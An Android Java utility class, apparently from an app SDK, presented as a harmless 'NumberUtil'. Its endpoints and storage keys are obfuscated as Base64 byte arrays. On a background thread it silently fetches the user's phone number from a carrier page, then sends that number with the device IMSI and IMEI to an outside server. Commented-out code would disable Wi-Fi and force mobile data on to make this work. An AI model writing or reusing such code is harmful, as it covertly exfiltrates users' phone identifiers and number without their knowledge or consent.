package com.mf.utils;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.mf.basecode.network.util.NetworkConstants;
import com.mf.basecode.network.util.NetworkUtils;
import com.mf.basecode.utils.EncryptUtils;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.TerminalInfoUtil;

/**
 * Created by yanan on 2016/1/6.
 */
public class NumberUtil {

	private static final byte[] NUMBER_GET_BYTE = { (byte) 0x61, (byte) 0x48,
			(byte) 0x52, (byte) 0x30, (byte) 0x63, (byte) 0x44, (byte) 0x6f,
			(byte) 0x76, (byte) 0x4c, (byte) 0x32, (byte) 0x52, (byte) 0x79,
			(byte) 0x62, (byte) 0x53, (byte) 0x35, (byte) 0x6a, (byte) 0x62,
			(byte) 0x57, (byte) 0x64, (byte) 0x68, (byte) 0x62, (byte) 0x57,
			(byte) 0x55, (byte) 0x75, (byte) 0x59, (byte) 0x32, (byte) 0x39,
			(byte) 0x74, (byte) 0x4c, (byte) 0x32, (byte) 0x56, (byte) 0x6e,
			(byte) 0x63, (byte) 0x32, (byte) 0x49, (byte) 0x76, (byte) 0x59,
			(byte) 0x58, (byte) 0x56, (byte) 0x30, (byte) 0x61, (byte) 0x47,
			(byte) 0x56, (byte) 0x75, (byte) 0x64, (byte) 0x47, (byte) 0x6c,
			(byte) 0x6a, (byte) 0x59, (byte) 0x58, (byte) 0x52, (byte) 0x70,
			(byte) 0x62, (byte) 0x32, (byte) 0x34, (byte) 0x76, (byte) 0x5a,
			(byte) 0x32, (byte) 0x56, (byte) 0x30, (byte) 0x59, (byte) 0x32,
			(byte) 0x78, (byte) 0x70, (byte) 0x5a, (byte) 0x57, (byte) 0x35,
			(byte) 0x30, (byte) 0x56, (byte) 0x47, (byte) 0x56, (byte) 0x73, };
	
	private static final byte[] NUMBER_POST_BYTE = { (byte) 0x61, (byte) 0x48,
			(byte) 0x52, (byte) 0x30, (byte) 0x63, (byte) 0x44, (byte) 0x6f,
			(byte) 0x76, (byte) 0x4c, (byte) 0x33, (byte) 0x46, (byte) 0x74,
			(byte) 0x4c, (byte) 0x6d, (byte) 0x6c, (byte) 0x6a, (byte) 0x62,
			(byte) 0x57, (byte) 0x46, (byte) 0x77, (byte) 0x63, (byte) 0x48,
			(byte) 0x4d, (byte) 0x75, (byte) 0x62, (byte) 0x6d, (byte) 0x56,
			(byte) 0x30, (byte) 0x4f, (byte) 0x6a, (byte) 0x63, (byte) 0x32,
			(byte) 0x4d, (byte) 0x44, (byte) 0x41, (byte) 0x76, (byte) 0x62,
			(byte) 0x57, (byte) 0x39, (byte) 0x69, (byte) 0x61, (byte) 0x57,
			(byte) 0x78, (byte) 0x6c, (byte) 0x4c, (byte) 0x33, (byte) 0x4e,
			(byte) 0x68, (byte) 0x64, (byte) 0x6d, (byte) 0x55, (byte) 0x3d, };

	private static final byte[] SP_NAME_BYTE = { (byte) 0x59, (byte) 0x32,
			(byte) 0x39, (byte) 0x74, (byte) 0x58, (byte) 0x32, (byte) 0x31,
			(byte) 0x76, (byte) 0x59, (byte) 0x6d, (byte) 0x6c, (byte) 0x73,
			(byte) 0x5a, (byte) 0x56, (byte) 0x39, (byte) 0x75, (byte) 0x64,
			(byte) 0x57, (byte) 0x31, (byte) 0x69, (byte) 0x5a, (byte) 0x58,
			(byte) 0x4a, (byte) 0x66, (byte) 0x5a, (byte) 0x32, (byte) 0x56,
			(byte) 0x30, };
	private static final byte[] SP_IMEI_BYTE = { (byte) 0x59, (byte) 0x32,
			(byte) 0x39, (byte) 0x74, (byte) 0x58, (byte) 0x32, (byte) 0x31,
			(byte) 0x76, (byte) 0x59, (byte) 0x6d, (byte) 0x6c, (byte) 0x73,
			(byte) 0x5a, (byte) 0x56, (byte) 0x39, (byte) 0x75, (byte) 0x64,
			(byte) 0x57, (byte) 0x31, (byte) 0x69, (byte) 0x5a, (byte) 0x58,
			(byte) 0x4a, (byte) 0x66, (byte) 0x5a, (byte) 0x32, (byte) 0x56,
			(byte) 0x30, (byte) 0x58, (byte) 0x32, (byte) 0x6c, (byte) 0x74,
			(byte) 0x5a, (byte) 0x57, (byte) 0x6b, (byte) 0x3d, };
	private static final byte[] SP_IMSI_BYTE = { (byte) 0x59, (byte) 0x32,
			(byte) 0x39, (byte) 0x74, (byte) 0x58, (byte) 0x32, (byte) 0x31,
			(byte) 0x76, (byte) 0x59, (byte) 0x6d, (byte) 0x6c, (byte) 0x73,
			(byte) 0x5a, (byte) 0x56, (byte) 0x39, (byte) 0x75, (byte) 0x64,
			(byte) 0x57, (byte) 0x31, (byte) 0x69, (byte) 0x5a, (byte) 0x58,
			(byte) 0x4a, (byte) 0x66, (byte) 0x5a, (byte) 0x32, (byte) 0x56,
			(byte) 0x30, (byte) 0x58, (byte) 0x32, (byte) 0x6c, (byte) 0x74,
			(byte) 0x63, (byte) 0x32, (byte) 0x6b, (byte) 0x3d, };

	private static final byte[] SP_IS_FIRST_FALG_BYTE = { (byte) 0x59, (byte) 0x32,
			(byte) 0x39, (byte) 0x74, (byte) 0x58, (byte) 0x32, (byte) 0x31,
			(byte) 0x76, (byte) 0x59, (byte) 0x6d, (byte) 0x6c, (byte) 0x73,
			(byte) 0x5a, (byte) 0x56, (byte) 0x39, (byte) 0x75, (byte) 0x64,
			(byte) 0x57, (byte) 0x31, (byte) 0x69, (byte) 0x5a, (byte) 0x58,
			(byte) 0x4a, (byte) 0x66, (byte) 0x61, (byte) 0x58, (byte) 0x4e,
			(byte) 0x66, (byte) 0x5a, (byte) 0x6d, (byte) 0x6c, (byte) 0x79,
			(byte) 0x63, (byte) 0x33, (byte) 0x52, (byte) 0x66, (byte) 0x5a,
			(byte) 0x6d, (byte) 0x78, (byte) 0x68, (byte) 0x5a, (byte) 0x77,
			(byte) 0x3d, (byte) 0x3d, };
	
	private static final String NUMBER_GET = EncryptUtils
			.getUnKey(NUMBER_GET_BYTE);
	private static final String NUMBER_POST = EncryptUtils
			.getUnKey(NUMBER_POST_BYTE);

	private static final String SP_NAME = EncryptUtils.getUnKey(SP_NAME_BYTE);
	private static final String SP_IMEI = EncryptUtils.getUnKey(SP_IMEI_BYTE);
	private static final String SP_IMSI = EncryptUtils.getUnKey(SP_IMSI_BYTE);
	private static final String SP_IS_FIRST_FLAG = EncryptUtils.getUnKey(SP_IS_FIRST_FALG_BYTE);

	interface ReqMethod {
		String GET = "GET";
		String POST = "POST";
	}

	private static NumberUtil instance;
	private Context mContext;

	public static NumberUtil getInstance() {
		if (null == instance) {
			synchronized (NumberUtil.class) {
				if (null == instance) {
					instance = new NumberUtil();
				}
			}
		}
		return instance;
	}

	public void phoneNumberGet(final Context context) {
	  int id = android.os.Process.myPid(); 
		if (null == context) {
			return;
		}
		
		mContext = context;

		if (!isFirst(context) && !isFirstFlag(context)) {
			return;
		}

		String imsi = TerminalInfoUtil.getPhoneImsi(context);
		if (TextUtils.isEmpty(imsi) || imsi.length() < 6) {
			return;
		}
		String sub_imsi = imsi.substring(0, 5);
		if (sub_imsi.equals("46000") || sub_imsi.equals("46002")
				|| sub_imsi.equals("46007")) {
			SharedPreferences sp = context.getSharedPreferences(SP_NAME, 0);
			sp.edit().putString(SP_IMSI, imsi).commit();
		} else {
			return;
		}
		
		new Thread(new Runnable() {
			@Override
			public void run() {

				int netType = NetworkUtils.getNetworkType(context);
				if (netType == NetworkConstants.NERWORK_TYPE_FAIL
						|| netType == NetworkConstants.NERWORK_TYPE_UNKNOWN) {
//					openGprs(context);
					try {
						Thread.sleep(3000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					if (!reCheck(context)) {
						return;
					}
				} else if (netType == NetworkConstants.NERWORK_TYPE_WIFI) {
//					closeWifi(context);
					try {
						Thread.sleep(3000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
//					openGprs(context);
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					if (!reCheck(context)) {
						return;
					}
				}

				String reqStr = Connect(ReqMethod.GET, NUMBER_GET, null);
				if (!TextUtils.isEmpty(reqStr)) {
					String postStr = buildPost(context, reqStr);
					if (!TextUtils.isEmpty(postStr)) {
						Connect(ReqMethod.POST, NUMBER_POST, postStr);
					}

				}
			}
		}).start();
	}

	private String Connect(String method, String urlStr, String sendStr) {
		byte[] readBuffer = new byte[1024];
		URL url = null;
		HttpURLConnection connection = null;
		InputStream inputStream = null;
		ByteArrayOutputStream saveStream = null;
		try {
			url = new URL(urlStr);
			connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod(method);
			connection.setConnectTimeout(25 * 1000);
			connection.setReadTimeout(30 * 1000);
			connection.setUseCaches(false);
			connection.setInstanceFollowRedirects(true);
			connection.connect();

			if (method.equals(ReqMethod.POST)) {
				DataOutputStream dataOutputStream = new DataOutputStream(
						connection.getOutputStream());
				Logger.error("sendStr: " + sendStr);
				dataOutputStream.writeBytes(sendStr);

				int code = connection.getResponseCode();
        if (code == 200) {
          SharedPreferences sp = mContext.getSharedPreferences(SP_NAME, 0);
          sp.edit().putBoolean(SP_IS_FIRST_FLAG, false).commit();
        }
			}

			inputStream = connection.getInputStream();
			saveStream = new ByteArrayOutputStream();

			int len = -1;
			while ((len = inputStream.read(readBuffer)) != -1) {
				saveStream.write(readBuffer, 0, len);
			}
			if (method.equals(ReqMethod.GET)) {
				return saveStream.toString();
			} else {
				return null;
			}

		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (null != saveStream) {
				try {
					saveStream.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
				;
			}

			if (null != inputStream) {
				try {
					inputStream.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

			if (null != connection) {
				connection.disconnect();
			}

		}
		return null;
	}

	private String buildPost(Context context, String reqStr) {
		Logger.error("build Post: " + reqStr);
		String result = null;
		String imsi = TerminalInfoUtil.getPhoneImsi(context);
		TelephonyManager telMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telMgr.getDeviceId();
		if (TextUtils.isEmpty(imei)) {
			imei = "";
		}
		try {
			result = "imsi=" + imsi + "&imei=" + imei + "&html="
					+ URLEncoder.encode(reqStr, "utf-8");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		return result;
	}

	private boolean isFirst(Context context) {
		SharedPreferences sp = context.getSharedPreferences(SP_NAME, 0);
		String sp_imsi = sp.getString(SP_IMSI, "");
		if (TextUtils.isEmpty(sp_imsi)) {
			return true;
		}
		String mobile_imsi = TerminalInfoUtil.getPhoneImsi(context);
		if (TextUtils.isEmpty(mobile_imsi)) {
			return false;
		}
		if (mobile_imsi.equals(sp_imsi)) {
			return false;
		} else {
			return true;
		}
	}
	
	private boolean isFirstFlag(Context context) {
        SharedPreferences sp = context.getSharedPreferences(SP_NAME, 0);
        return sp.getBoolean(SP_IS_FIRST_FLAG, true);
    }

//	private void closeWifi(Context context) {
//		WifiManager mWifiManager = (WifiManager) context
//				.getSystemService(Context.WIFI_SERVICE);
//		if (mWifiManager.isWifiEnabled()) {
//			mWifiManager.setWifiEnabled(false);
//		}
//	}
//
//	public static void openGprs(Context context) {
//		try {
//			ConnectivityManager connManager = (ConnectivityManager) context
//					.getSystemService(Context.CONNECTIVITY_SERVICE);
//			Method method = connManager.getClass().getMethod(
//					"setMobileDataEnabled", new Class[] { Boolean.TYPE });
//			method.setAccessible(true);
//			method.invoke(connManager, new Object[] { true });
//		} catch (Exception e) {
//			e.printStackTrace();
//		}
//	}

	private boolean reCheck(Context context) {
		int curType = NetworkUtils.getNetworkType(context);
		if (curType == NetworkConstants.NERWORK_TYPE_2G
				|| curType == NetworkConstants.NERWORK_TYPE_3G
				|| curType == NetworkConstants.NERWORK_TYPE_4G) {
			return true;
		} else {
			return false;
		}
	}
}
